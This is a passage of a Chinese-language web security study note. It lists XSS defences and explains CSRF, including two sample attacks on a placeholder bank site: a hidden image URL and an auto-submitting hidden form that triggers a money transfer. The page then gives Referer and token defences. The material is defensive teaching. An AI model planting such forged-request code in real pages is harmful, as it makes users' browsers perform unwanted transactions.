无限循环</p> <h4 id="防御手段"><a href="#防御手段" class="header-anchor">#</a> 防御手段：</h4> <ul><li>输入过滤，过滤“&lt;”、“&gt;”、“/”等可能导致脚本注入的特殊字符，或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等，还得考虑攻击者使用十六进制编码来输入脚本的方式。</li> <li>输出进行编码，和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过 HtmlEncoder 等工具编码，这样就不会存在直接输出可执行的脚本了</li> <li>Cookie 设置 http-only，这样用脚本就无法获取 Cookie 了</li> <li>Cookie 防盗，尽可能地避免在 Cookie 中泄露隐私，如用户名、密码等，或者，为了防止重放攻击，可以将 Cookie 和 IP 进行绑定，这样也可以阻止攻击者冒充正常用户的身份</li></ul> <h3 id="csrf"><a href="#csrf" class="header-anchor">#</a> CSRF</h3> <p>跨站请求伪造（cross-site request forgery）</p> <ul><li>伪造用户身份操作</li></ul> <p><img src="/assets/img/CSRF.32311396.png" alt="An image"></p> <h4 id="攻击手段-2"><a href="#攻击手段-2" class="header-anchor">#</a> 攻击手段：</h4> <ol><li>譬如在网站内的图片资源中潜入恶意的转账操作</li></ol> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre></div><ol start="2"><li>构建恶意的隐藏表单，并通过脚本提交恶意请求</li></ol> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token style language-css"><span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">&quot;</span></span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>csrf-frame<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.bank.example/transfer<span class="token punctuation">&quot;</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>csrf-frame<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>csrf-form<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>toBankId<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hello<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>amount<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>1000000<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'csrf-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h4 id="防御手段-2"><a href="#防御手段-2" class="header-anchor">#</a> 防御手段：</h4> <ul><li><p>验证 HTTP Referer 字段（非常简单，但是鉴于客户端并不可信任，所以并不是很安全）
（防止 CSRF，检查 Referer 字段简单直接，但是其完全依赖浏览器发送正确的 Referer 字段。
虽然 http 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，
亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。）</p></li> <li><p>在请求地址中添加 token 并验证
（譬如 post 中，以参数的形式加入一个随机产生的 token）</p></li></ul> <p>参考：</p> <ul><li><a href="https://segmentfault.com/a/1190000012693772" target="_blank" rel="noopener noreferrer">AJAX 请求真的不安全么？谈谈 Web 安全与 AJAX 的关系<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/note/Node.html" class="prev">
        Node
      </a></span> <span class="next"><a href="/note/HTTP.html">
        HTTP
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1713fb38.js" defer></script><script src="/assets/js/2.8a78f676.js" defer></script><script src="/assets/js/3.77fa144c.js" defer></script>
  </body>
</html>
